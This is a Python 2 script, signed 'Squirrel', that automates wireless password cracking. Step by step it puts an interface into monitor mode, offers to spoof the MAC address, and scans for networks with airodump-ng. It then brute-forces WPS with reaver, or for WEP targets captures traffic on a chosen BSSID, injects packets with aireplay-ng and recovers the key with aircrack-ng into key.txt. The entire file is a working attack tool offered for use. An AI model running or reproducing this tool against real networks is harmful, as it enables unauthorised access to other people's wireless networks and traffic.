#!/usr/bin/env python         
print '#####################################\n## WEP cracking script by Squirrel ##\n#####################################'
print '\nThis script will guide you through WEP and WPA/WPA2 password cracking.\nThis scripts assumes you have aircrack and reaver installed.\nYou can find aircrack at: http://www.aircrack-ng.org\nYou can find reaver-wps at: http://code.google.com/p/reaver-wps/'
print '\nThe script will open a few additional terminal windows (tabs in KDE and windows in GNOME).\nPlease do not close any of them as this is needed for the process.\n'
import sys
import time
import os
import subprocess
import commands
#preperations
#------------------------------------------------------------------------------------
bssid='' #variable decleration
chanel=''#variable decleration
term=''  #variable decleration
numeric='0123456789' #variable decleration
testStr='mon' #variable decleration
read=commands.getoutput('iwconfig') #variable decleration
inface='' #variable decleration
airmon_start='' #variable decleration
monitor_interface='' #variable decleration
count=0 #variable decleration
def tryme():
  os.system('echo yalla')
def flushMon(): #a method to flush all monitor mode interfaces
  monList=[]
  read=commands.getoutput('ifconfig')
  monitor_interface=''
  i=0
  count=0
  while i<len(read):
    if read[i]=='m':
      if read[i+1]=='o':
	if read[i+2]=='n':
	  if read[i+3] in numeric:
	    count=count+1
	    monList.append(read[i:i+4])   
    i=i+1
  i=0
  while i<len(monList):
    monStop='airmon-ng stop '+monList[i]
    os.system(monStop)
    i=i+1  
    
def count():  #counts how many monitor mode interfaces exists
  read=commands.getoutput('ifconfig')
  monitor_interface=''
  i=0
  count=0
  while i<len(read):
    if read[i]=='m':
      if read[i+1]=='o':
	if read[i+2]=='n':
	  if read[i+3] in numeric:
	    count=count+1    
    i=i+1
  if count==1:
    i=0
    while i<len(read):
      if read[i]=='m':
	if read[i+1]=='o':
	  if read[i+2]=='n':
	    j=i
	    for i in range(j,len(read)):
	      if read[i].isspace():
		monitor_interface=read[j:i]
		return monitor_interface
		break
	      i=i+1    
      i=i+1
  if count>1:
    infaceNum=count-1
    infaceStr=str(infaceNum)
    monitor_interface='mon'+infaceStr
    return monitor_interface

  
def infaceselect(): # interface selection method 
  if testStr in read:
    print read
    while True:
      select=raw_input('The system has found that you already have a wireless interface in monitor mode,\nwould you like to use it? (if yes enter the interface name, if no enter n) ')
      if select=='n' or select=='N':
	break
      if len(select)<4:
	print 'Invalid selection please enter a valid interface starting with monx (x is a number) from the list'
	continue
      if select[0:3]!='mon':
	print 'Invalid selection please enter a valid interface starting with monx (x is a number) from the list'
	continue
      if select not in read:
	print 'Invalid selection please enter a valid interface starting with monx (x is a number) from the list'
	continue
      if select in read and select[0:3]=='mon':
	inface=select
	return inface
    if select=='n' or select--'N':
      os.system('iwconfig')
      while True:	
	  inface=raw_input("Choose your wireless interface (i.e wlan0, wifi0, ath0, eth0) to create a monitor mode interface ")
	  if len(inface)==4:
		  if inface in read and inface[3] in numeric:
			  airmon_start_tupple='airmon-ng start '+inface
			  airmon_start=str(airmon_start_tupple)
			  os.system(airmon_start)	
			  break
		  else:	
			  print 'Invalid interface selected please try again'
			  continue
	  if len(inface)==5:
		  if inface in read and inface[4] in numeric:
			  airmon_start_tupple='airmon-ng start '+inface
			  airmon_start=str(airmon_start_tupple)
			  os.system(airmon_start)	
			  break
		  else:
			  print 'Invalid interface selected please try again'
			  continue
	  elif len(inface)!=4 or len(inface)!=5:
		  print 'Invalid interface selected please try again'
		  continue
      return count()
  else:
    os.system('iwconfig')
    while True:	
	  inface=raw_input("Choose your wireless interface (i.e wlan0, wifi0, ath0, eth0) to create a monitor mode interface ")
	  if len(inface)==4:
		  if inface in read and inface[3] in numeric:
			  print index(inface)
			  airmon_start_tupple='airmon-ng start '+inface
			  airmon_start=str(airmon_start_tupple)
			  os.system(airmon_start)	
			  break
		  else:	
			  print 'Invalid interface selected please try again'
			  continue
	  if len(inface)==5: 
		  if inface in read and inface[4] in numeric:
			  airmon_start_tupple='airmon-ng start '+inface
			  airmon_start=str(airmon_start_tupple)
			  os.system(airmon_start)	
			  break
		  else:
			  print 'Invalid interface selected please try again'
			  continue
	  elif len(inface)!=4 or len(inface)!=5:
		  print 'Invalid interface selected please try again'
		  continue
    return count()
    
def fManager(term): #KDE/GNOME recognition
  testStr='/usr/lib/kde'
  read=commands.getoutput('ps -ef | grep kde')
  i=0
  while i<=len(read):
    if testStr in read:
      term='konsole --new-tab --noclose -e bash -c "'
      break
    else:
      term='gnome-terminal --geometry=100x40 -x bash -c "'
      break
  return term
def macSani(bssid): #This function was meant to sanitize target's bssid entered by user 
	hexa=':0123456789ABCDEFacbdef'
	while True:
		bssid=raw_input("Enter a Valid target's BSSID: ")
		if len(bssid)!=17:
			print 'MAC address provided is not a valid one, please try again'
			continue
		if bssid[2]!=':'or bssid[5]!=':'or bssid[8]!=':'or bssid[11]!=':'or bssid[14]!=':':
			print 'MAC address provided is not a valid one, please try again'
			continue
		else:
			i=0
			while i<=16:
				if bssid[i] not in hexa:
					print 'MAC address provided is not a valid one, please try again'
					
					bssid=raw_input('Enter a Valid MAC address: ')
				else:
					break
				i=i+1
		break
	return bssid
#---------------------------------------------------------------------------------------------	
def chanSani(chanel):#This function was meant to sanitize target's chanel entered by user
	while True:
		
		try:
			chanel=int(raw_input("Please enter target's Channel "))
			if chanel>14 or chanel<1:		
				print  'Channel invalid, must be a number between 1-14'
				continue
		except ValueError:
			print 'Channel invalid, must be a number between 1-14'
			continue		
		break	
	return str(chanel)
		
#--------------------------------------------------------------------------------------
#interface selection
#script is working with interface names - wlanx, wifix, ethx, athx, monx, where x is a digit between 0-9
myTerminal=fManager(term)
monitor_interface=infaceselect()
os.system(airmon_start)
#MAC address sanitation block-----------------------------------------------------------------------
yesno='ynYN'
myMac=''
interfaceTupple='ifconfig '+monitor_interface
while True:
	macChange=raw_input("Would you like to change your MAC address to a spoofed MAC? (enter y/n) ")
	if len(macChange)!=1:
		print 'Invalid selection please enter y/n'
		continue
	if macChange not in yesno:
		print 'Invalid selection please enter y/n'
		continue
	if macChange=='y'or macChange=='Y':
		hexa=':0123456789ABCDEFacbdef'
		interfaceTupple='ifconfig '+monitor_interface
		downTupple=interfaceTupple+' down'
		upTupple=interfaceTupple+' up'
		while True:
			changer=raw_input('Enter a Valid MAC address: ')
			if len(changer)!=17:
				print 'MAC address provided is not a valid one, please try again'
				continue   
			if changer[2]!=':'and changer[5]!=':'and changer[8]!=':'and changer[11]!=':'and changer[14]!=':':
				print 'MAC address provided is not a valid one, please try again'
				continue
			i=0
			while i<=16:
				if changer[i] not in hexa:
					print 'MAC address provided is not a valid one, please try again'
					changer=raw_input('Enter a Valid MAC address: ')
				i=i+1
			os.system(downTupple)
			mactupple='macchanger --mac '+changer+' '+monitor_interface
			os.system(mactupple)
			os.system(upTupple)
			myMac=changer
			break
	if macChange=='n' or macChange=='N':
		y=commands.getoutput(interfaceTupple)
		x=y[36:53]
		myMac=x[0:2]+':'+x[3:5]+':'+x[6:8]+':'+x[9:11]+':'+x[12:14]+':'+x[15:17]
		print '\nMAC used for this session: '+myMac
		break
	break				
#--------------------------------------------------------------------------------------
print "\nStarting scan for networks.\nA new window/tab has opened for the scan. The scan will operate for 18 seconds.\nWhen the scan is done, use the information showed in the table to fill in the cracking variables"

#scanning
#-------------------------------------------------------------------------------------
instruct='echo Scanning has stopped. Use this screen to copy information'
instruct2='echo to the script running in  the first tab/window'
adumpScan=myTerminal+' airodump-ng '+monitor_interface+';'+instruct+';'+instruct2+'"'
os.system(adumpScan)
time.sleep(18)
os.system('pkill airodump-ng')
while True:
  reaverPmpt=raw_input("Would you like to use Reaver for WPA/WPA2 caracking? ")
  if len(reaverPmpt)!=1:
    print "Invalid selection please type y/n"
    continue
  if reaverPmpt not in yesno:
    print "Invalid selection please type y/n"
    continue
  if reaverPmpt=='y' or reaverPmpt=='Y':
    break
  if reaverPmpt=='n' or reaverPmpt=='N':
    break
if reaverPmpt=='y' or reaverPmpt=="Y":
  bssid=macSani(bssid)
  chanel=chanSani(chanel)
  reav="reaver -i "+monitor_interface+" -b "+bssid+" -c "+chanel+" -vv"
  os.system(reav)
  os.system("pkill -SIGSTOP reaver")
  print'\n\nThis script has been written by Squirrel'
  sys.exit()
if reaverPmpt=='n' or reaverPmpt=='N':    
  bssid=macSani(bssid)
  chanel=chanSani(chanel)
  essid=raw_input("Please enter target's ESSID ")
  capfile=raw_input("Please enter the capture's file name ")
  print "The system has all the information needed to start the cracking process\n"
  print "Associating with target"
  airodump0=myTerminal
  airodump1='airodump-ng'+' -c '+chanel+' -w '+capfile+' --bssid '+bssid+' '+monitor_interface+'"'
  airodumpFin=airodump0+airodump1
  os.system(airodumpFin)
#injection
#-----------------------------------------------------------------------------------------
  aireplay0=myTerminal
  aireplay1='aireplay-ng -1 0 -a '+bssid+' -h '+myMac+' -e '+"'"+essid+"'"+' '+monitor_interface+' && '
  airplay1='aireplay-ng -3 -b '+bssid+' -h '+myMac+' '+monitor_interface+'"'
  final=aireplay0+aireplay1+airplay1
  print 'Starting packet injection process. please wait while this can take a while...'
  time.sleep(1)
  os.system(final)
#-------------------------------------------------------------------------------------------------------
#Crack
#-----------------------------------------------------------------------------------------
  print 'Aircrack will start the cracking process in 2 minutes\nPlease be patient while data is being collected.'
  time.sleep(120)
  os.system('aircrack-ng -b '+bssid+' '+' -l key.txt '+capfile+'-01.cap')
  print 'SUCCESS!'
  print 'All injection and data collection processes have been stopped!'
  os.system('pkill -SIGSTOP airodump-ng')
  os.system('pkill -SIGSTOP aireplay-ng')
  print 'A file named key.txt was created\nin your home folder containing the WEP key you have just obtained.' 
  print '\n\nPlease select one of the following:'
  print '\n\n1. Remove all monitor mode interfaces.'
  print '2. Remove monitor mode interface used in this session.'
  print '3. Dont remove any monitor mode interface.'
while True:
    monRemove=raw_input('Enter selection: ')
    if monRemove=='1':
      flushMon()
      print 'All monitor mode interfaces were removed'
      break
    if monRemove=='2':
      tup='airmon-ng stop '+monitor_interface
      os.system(tup)
      print monitor_interface+' was removed'
      break
    if monRemove=='3':
      break
    else:
      print 'Invalid option selection, please enter 1 or 2'
      continue
print'\n\nThis script has been written by Squirrel'
#-------------------------------------------------------------------------------------















